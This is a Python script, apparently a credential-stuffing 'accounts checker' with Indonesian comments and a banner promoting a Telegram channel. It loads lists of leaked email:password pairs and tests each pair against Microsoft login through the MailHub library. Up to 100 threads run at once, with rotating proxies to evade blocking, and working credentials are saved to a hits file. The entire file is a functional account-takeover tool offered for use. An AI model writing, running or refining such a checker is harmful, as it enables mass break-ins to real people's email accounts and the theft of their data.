import os
import random
import time
import threading
from queue import Queue, Empty
from colorama import init, Fore, Style
from datetime import datetime
from mailhub.mailhub import MailHub

# Inisialisasi colorama
init(autoreset=True)

# Variabel global
checked = 0
hits = 0
fails = 0
errors = 0
start_time = 0
running = False
stop_event = threading.Event()
write_lock = threading.Lock()
mailhub = MailHub()

# Konfigurasi
DELAY_BETWEEN_CHECKS = 1  # Delay dalam detik antara pengecekan
MAX_THREADS = 100         # Maksimum thread yang diizinkan

def clear_screen():
    """Membersihkan layar untuk Termux"""
    os.system('clear')

def print_banner(threads_count):
    """Menampilkan banner program yang dioptimasi untuk Termux"""
    banner = f"""
{Fore.RED}╔════════════════════════════════════════╗
{Fore.RED}║ ██╗  ██╗ ██████╗ ████████╗███████╗   ║
{Fore.RED}║ ██║  ██║██╔═══██╗╚══██╔══╝██╔════╝   ║
{Fore.RED}║ ███████║██║   ██║   ██║   █████╗     ║
{Fore.RED}║ ██╔══██║██║   ██║   ██║   ██╔══╝     ║
{Fore.RED}║ ██║  ██║╚██████╔╝   ██║   ███████╗   ║
{Fore.RED}║ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝   ║
{Fore.GREEN}╠════════════════════════════════════════╣
{Fore.YELLOW}║  [+] JOIN: t.me/axycloud              ║
{Fore.GREEN}╠════════════════════════════════════════╣
{Fore.YELLOW}║  [!] HOTFAMS ACCOUNTS CHECKER [!]     ║
{Fore.GREEN}╠════════════════════════════════════════╣
{Fore.GREEN}║ Threads: {threads_count:<2} | Delay: {DELAY_BETWEEN_CHECKS}s  ║
{Fore.RED}╚════════════════════════════════════════╝
{Fore.RESET}"""
    print(banner)

def print_progress(combo, proxy, status, color):
    """Mencetak progres pengecekan"""
    time_str = datetime.now().strftime("%H:%M:%S")
    proxy_display = proxy if proxy else "No Proxy"
    print(f"{color}[{status}] {combo} | {proxy_display} | {time_str}{Fore.RESET}")

def print_final_stats():
    """Menampilkan statistik akhir"""
    elapsed = time.time() - start_time
    cpm = int((checked / elapsed) * 60) if elapsed > 0 else 0
    
    stats = f"""
{Fore.CYAN}╔════════════════════════════════════════╗
{Fore.CYAN}║          {Fore.WHITE}CHECKING COMPLETED          {Fore.CYAN}║
{Fore.CYAN}╠════════════════════════════════════════╣
{Fore.CYAN}║ {Fore.WHITE}Checked: {Fore.CYAN}{checked:<8}{Fore.WHITE} Hits: {Fore.CYAN}{hits:<8}{Fore.WHITE} Fails: {Fore.CYAN}{fails:<8}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}Errors: {Fore.CYAN}{errors:<8}{Fore.WHITE} CPM: {Fore.CYAN}{cpm:<8}{Fore.WHITE} Time: {Fore.CYAN}{time.strftime('%H:%M:%S', time.gmtime(elapsed)):<8}{Fore.CYAN}║
{Fore.CYAN}╚════════════════════════════════════════╝
{Fore.RESET}"""
    print(stats)

def worker(combo_queue, proxies, hits_file):
    """Fungsi thread worker dengan penanganan antrian tetap"""
    global checked, hits, fails, errors

    while running and not stop_event.is_set():
        combo = None  # Inisialisasi variabel combo
        try:
            combo = combo_queue.get(timeout=0.5)
            
            # Menambahkan delay pemrosesan
            time.sleep(DELAY_BETWEEN_CHECKS)

            if stop_event.is_set():
                combo_queue.put(combo)
                break

            try:
                # Validasi format combo
                parts = combo.strip().split(":")
                if len(parts) != 2:
                    errors += 1
                    checked += 1
                    print_progress(combo, "", "INVALID", Fore.YELLOW)
                    continue

                email, password = parts[0], parts[1]

                # Menyiapkan proxy
                proxy_str = random.choice(proxies) if proxies else None
                proxy = {"http": f"http://{proxy_str}"} if proxy_str else None
                try:
                    res = mailhub.loginMICROSOFT(email, password, proxy)[0]
                except Exception as e:
                    res = "error"
                checked += 1
                if res == "ok":
                    hits += 1
                    status = "HIT"
                    color = Fore.GREEN
                    if hits_file:
                        with write_lock:
                            hits_file.write(f"{email}:{password}\n")
                            hits_file.flush()
                elif res == "error":
                    errors += 1
                    status = "ERROR"
                    color = Fore.RED
                else:
                    fails += 1
                    status = f"FAIL ({res})"
                    color = Fore.RED

                print_progress(f"{email}:{password}", proxy_str, status, color)

            except Exception as e:
                errors += 1
                checked += 1
                print_progress(combo, "", "CRASH", Fore.RED)

        except Empty:
            continue
        finally:
            if combo is not None:
                combo_queue.task_done()

def main():
    global checked, hits, fails, errors, start_time, running
    clear_screen()
    print_banner(0)
    print(f"\n{Fore.CYAN}[?] Path to combo file (email:pass): {Fore.RESET}", end="")
    combo_path = input().strip()
    print(f"{Fore.CYAN}[?] Path to proxy file (leave empty for no proxy): {Fore.RESET}", end="")
    proxy_path = input().strip()
    print(f"{Fore.CYAN}[?] Threads (default 10, max {MAX_THREADS}): {Fore.RESET}", end="")
    threads_count = min(int(input().strip() or 10), MAX_THREADS)
    print(f"{Fore.CYAN}[?] Output file (default hits.txt): {Fore.RESET}", end="")
    output_file = input().strip() or "hits.txt"
    
    try:
        with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
        if not combos:
            print(f"{Fore.RED}[ERROR] No valid combos found!{Fore.RESET}")
            return
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to load combo file: {str(e)}{Fore.RESET}")
        return
    
    proxies = []
    if proxy_path:
        try:
            with open(proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
                proxies = [p.strip() for p in f if p.strip()]
        except Exception as e:
            print(f"{Fore.YELLOW}[WARNING] Failed to load proxies: {str(e)}{Fore.RESET}")
    
    try:
        hits_file = open(output_file, 'a', encoding='utf-8')
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to open output file: {str(e)}{Fore.RESET}")
        return
    
    clear_screen()
    print_banner(threads_count)
    print(f"{Fore.YELLOW}[!] Starting checker (Delay: {DELAY_BETWEEN_CHECKS}s)...{Fore.RESET}\n")

    running = True
    start_time = time.time()
    combo_queue = Queue()
    for combo in combos:
        combo_queue.put(combo)
    
    threads = []
    for _ in range(threads_count):
        t = threading.Thread(target=worker, args=(combo_queue, proxies, hits_file))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while running and (combo_queue.qsize() > 0 or any(t.is_alive() for t in threads)):
            time.sleep(0.5)
    except KeyboardInterrupt:
        running = False
        stop_event.set()
        print(f"\n{Fore.YELLOW}[!] Stopping...{Fore.RESET}")
    
    hits_file.close()
    print_final_stats()
    print(f"{Fore.GREEN}[+] Valid accounts saved to: {output_file}{Fore.RESET}")

if __name__ == "__main__":
    main()
